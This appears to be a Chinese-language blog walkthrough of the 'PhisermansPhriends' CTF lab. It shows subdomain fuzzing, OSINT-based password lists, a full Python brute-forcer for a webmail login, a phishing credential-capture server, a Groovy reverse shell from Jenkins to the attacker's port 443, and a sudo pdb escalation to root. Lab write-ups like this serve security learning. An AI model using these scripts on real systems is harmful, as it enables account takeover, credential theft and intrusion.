---
title: "晚间温暖小火炉：PhisermansPhriends-WP"
date: 2025-8-10
categories: [learn,wp,随笔]
tags: [learn,thehackerlabs_wp]
---

## PhisermansPhriends-WP

这个靶场不寻常，记录下

#### 信息收集

```bash
kali@kali:~/tools$ sudo nmap -sT -p- 192.168.200.166
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-09 12:39 EDT
Nmap scan report for 192.168.200.166 (192.168.200.166)
Host is up (0.0011s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE  SERVICE
22/tcp  open   ssh
80/tcp  open   http
443/tcp closed https
MAC Address: 00:0C:29:1A:53:F9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 104.02 seconds
```

目标开放22，80，端口，枚举web文件和目录都没有找到什么

80是Estamos modificando la web. Contacto: mur.rusko@phisermansphriends.thl y admin@phisermansphriends.thl有两个邮箱

看别人wp得知还能去测子域名，以前没遇到过这种类似靶场

mail.phi....是个邮件系统，intranet.phi......是jenkins；

```bash
kali@kali:~$ wfuzz -u http://phisermansphriends.thl -H "Host:FUZZ.phisermansphriends.thl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 301

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://phisermansphriends.thl/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000002:   200        96 L     337 W      5367 Ch     "mail"                                                                   
000000058:   403        5 L      13 W       589 Ch      "intranet"
```

这谁能想到 在instagram能找到个帖子，泄露了写名字和生日。mur rusko 1990年5月20日, 

cupp能根据信息生成密码，我也有过这种工具想法，我也偶尔会有名字和日期组合做密码。

#### 立足点

mail系统爆破密码，登录有token验证，下次登录的token 会在本次发包后的respond中显示出来

别人的脚本

```python
import argparse
import sys
import requests
import re
from multiprocessing.dummy import Pool as ThreadPool

settings = {
    "threads" : 10,
    "username" : "mur.rusko@phisermansphriends.thl",
    "url" : "http://mail.phisermansphriends.thl/"
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
}

if (len(sys.argv) > 1):
    console_mode = True
    parser = argparse.ArgumentParser(description='Command line mode')
    parser.add_argument('--threads', '-t', type=int,
                        help='Number of Threads', default=10)

    args = parser.parse_args()
    if (not args.threads):
        print("'--threads' was omitted")
        exit(-1)
    
    settings["threads"] = args.threads

def parse_token(text):
    pattern = 'request_token":"(.*)"}'
    token = re.findall(pattern, text)
    return token

def brute(login):
    try:
        url = settings['url']
        r = requests.get(url)
        cookies = r.cookies
        token = parse_token(r.text)
        r = requests.post(url + '?_task=login',
                          data={"_token": token, "_task": "login", "_action": "login", "_timezone": "Asia/Shanghai",
                                "_url": "_task=login", "_user": settings['username'], "_pass": login}, headers=headers, cookies=cookies,
                          allow_redirects=False, timeout=30)

        if (r.status_code == 302):
            print("Succes with %s:%s" % (settings['username'], login))
            sys.exit()
        else:
            print(f"Code: {r.status_code} - passw: {login}")
    except Exception as ex:
        print(ex)

def verify():
    try:
        url = settings['url']
        r = requests.get(url, timeout=1)
        token = parse_token(r.text)
        if(token == ""):
            return False
        return True
    except Exception as ex:
        print(ex)
        return False

if __name__ == "__main__":
    passwords = open(r"D:\netTools\cupp-pass-generate\cupp-master\mur.txt").read().split('\n')

    print("%d passwords loaded" % (len(passwords)))
    print("Trying with username %s" % (settings['username']))
    print("-----------------------------------------------------")

    if(not verify()):
        sys.exit()
    pool = ThreadPool(settings['threads'])
    results = pool.map(brute, passwords)
    pool.close()
    pool.join()

    print("-----------------------------------------------------")
    print("The End")
```

得到mail密码 MurRusko_90

<img src="assets/images/2025/hacking/PhisermansPhriends-WP/01.png" alt="01" style="zoom:50%;" />

看wp还要钓鱼，难绷.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        try:
            file_path = '.' + self.path
            with open(file_path, 'rb') as file:
                self.send_response(200)
                if file_path.endswith('.html'):
                    self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(file.read())
        except FileNotFoundError:
            self.send_response(404)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"404 Not Found")
            
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                body = self.rfile.read(content_length)
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Received POST request with body: " + body)
                print(body)

def run_server():
    server_address = ('', 80)
    httpd = HTTPServer(server_address, RequestHandler)
    print("Server running on port 80...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
```

得到jenkins后台账号密码

Received POST request with j_username: admin, j_password: RqykJVKDt2RBjnR2q1zeIMYm

后台弹shell，只有443端口能弹，这也给了我们思路，弹不了shell，不仅试试busybox curl什么的 还可以换换端口试试。

```python
def host = "192.168.200.153"
def port = 443

def socket = new Socket(host, port)
def process = ['bash','-i'].execute()

def inputStream = socket.getInputStream()
def outputStream = socket.getOutputStream()
def processInput = process.getInputStream()
def processError = process.getErrorStream()
def processOutput = process.getOutputStream()

// 把Socket输入流数据写入Process标准输入
Thread.start {
    try {
        inputStream.eachByte(1024) { bytes, len ->
            processOutput.write(bytes, 0, len)
            processOutput.flush()
        }
    } catch(Exception e){}
}

// 把Process标准输出写入Socket输出流
Thread.start {
    try {
        processInput.eachByte(1024) { bytes, len ->
            outputStream.write(bytes, 0, len)
            outputStream.flush()
        }
    } catch(Exception e){}
}

// 把Process错误输出写入Socket输出流
Thread.start {
    try {
        processError.eachByte(1024) { bytes, len ->
            outputStream.write(bytes, 0, len)
            outputStream.flush()
        }
    } catch(Exception e){}
}

```

拿到jenkins shell，密码复用 切换到用户mur

#### 提权

sudo -l (ALL) NOPASSWD: /usr/bin/python3 /opt/util.py

执行进入pdb

在 `pdb` 模式下，可以执行任意 Python 代码，间接执行 shell 命令。

```bash
sudo /usr/bin/python3 /opt/util.py
sudo: unable to resolve host TheHackersLabs-phisermansphriends.thl: Fallo temporal en la resolución del nombre
[Errno 98] Address already in use
> /opt/util.py(12)<module>()
-> sock.bind(('127.0.0.1', port))
(Pdb) !import os
(Pdb) !os.system("id")  
uid=0(root) gid=0(root) grupos=0(root)
0
(Pdb) !os.system("bash")
id
uid=0(root) gid=0(root) grupos=0(root)
whoami
root
```

